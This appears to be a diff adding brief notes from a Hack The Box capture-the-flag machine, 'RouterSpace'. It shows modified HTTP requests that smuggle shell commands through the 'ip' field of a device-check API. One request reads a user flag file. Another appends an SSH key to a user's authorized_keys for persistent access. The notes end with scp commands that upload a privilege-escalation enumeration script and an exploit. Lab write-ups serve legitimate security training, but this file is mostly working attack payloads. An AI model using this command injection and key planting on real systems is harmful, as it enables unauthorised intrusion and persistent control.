@@ -1,0 +1,42 @@
+modified burp request:
+
+POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+accept: application/json, text/plain, */*
+user-agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 51
+Host: routerspace.htb
+Connection: close
+Accept-Encoding: gzip, deflate
+
+{"ip":"\ncd ../../../../home/paul && cat user.txt"}
+
+result:
+
+HTTP/1.1 200 OK
+X-Powered-By: RouterSpace
+X-Cdn: RouterSpace-38625
+Content-Type: application/json; charset=utf-8
+Content-Length: 38
+ETag: W/"26-9su6nE6XrUWLbrBZajd4QhL8FtU"
+Date: Thu, 26 May 2022 19:37:20 GMT
+Connection: close
+
+"\nFLAG :)\n"
+
+POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+accept: application/json, text/plain, */*
+user-agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 625
+Host: routerspace.htb
+Connection: close
+Accept-Encoding: gzip, deflate
+
+{"ip":"\necho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX6vD6yLlRrXzAKTdOuiC1bTFPpHmaGCRpMk3j4LeRzWAsmlx6IJnWQ28UFOGJ71WetYDUG8wDWo7Tji6Ez5xG8zmfddbqAxazxmGIbMBlsiw3apD3cAsG0jrkvn/oMr/HRlK75NrjkV2EHVTty6vnrpMPU3WQ37A7Wr/nZ6i+8jw0vwXjMFX2Wkif71CO3/6epqDItjBCotIjqPJByri//2dZcxjrp+kLbJHYjy1e6RUrcpD91o0OxtRYqjRQQzjH/yadlsCLtzTrxoT5WRl45NdoYd3Z0ZTgQH7iV9eppRvXGQC22igsl2k84vr5OzTeNoGohzC+UP6+gnfuTSIO6oZJHEj0970+i5TwjsLy1Ig4gCpHNavfxXafsCVCqOagrRvbebybWHVLe+OuWhvMNE/5PZYeyBRolUkp42vBVT6TIvV5JcYoheCCEHgPw+mkydwV9rCTi0+1q90phf3Ks4kTKbOTtzBBFqAeLZwnhjV7AVxTnwXs1vlcHDm0mec= cakehonolulu@RYZEN5' >> /home/paul/.ssh/authorized_keys"}
+
+iptables forbids internet connection
+
+scp -i /home/cakehonolulu/.ssh/id_rsa linpeas.sh paul@routerspace.htb:.
+
+scp -i /home/cakehonolulu/.ssh/id_rsa exploit.py paul@routerspace.htb:.
